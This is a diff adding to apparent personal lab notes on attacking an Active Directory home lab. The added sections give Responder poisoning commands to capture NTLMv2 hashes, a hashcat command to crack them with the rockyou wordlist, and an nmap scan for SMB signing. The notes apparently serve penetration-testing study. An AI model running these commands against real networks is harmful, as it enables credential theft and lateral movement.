@@ -361,3 +361,23 @@ Open files -> network -> enable network file sharing on all vms
 on SPIDERMAN do the exact same thing but in group administrators add both pparker and fcastle
 log back in to local user .\peterparker -> folder -> thisPC -> computer -> map network drive -> folder: \\HYDRA-DC\hackme -> connect using different credentials -> verify with administrator
 ![image](https://github.com/user-attachments/assets/4cec93bc-b3e6-40a7-b004-ae87c372d330)
+
+
+###AD responder
+
+sudo responder -I eth0 -dPv
+
+On windows machine file explorer type \\{kali ip}
+
+(hash will be seen on kali machine, 5600 is the module, check from hashcat wiki"
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+
+<img width="586" height="77" alt="image" src="https://github.com/user-attachments/assets/fdd45a35-7785-494c-927a-c9587d3f5e18" />
+
+###SMB
+
+nmap --script=smb2-security-mode.nse -p445 {ip} -Pn
+
+<img width="677" height="244" alt="image" src="https://github.com/user-attachments/assets/0cd3a401-3b3d-4e9e-bed6-021eaf54def9" />
+
+
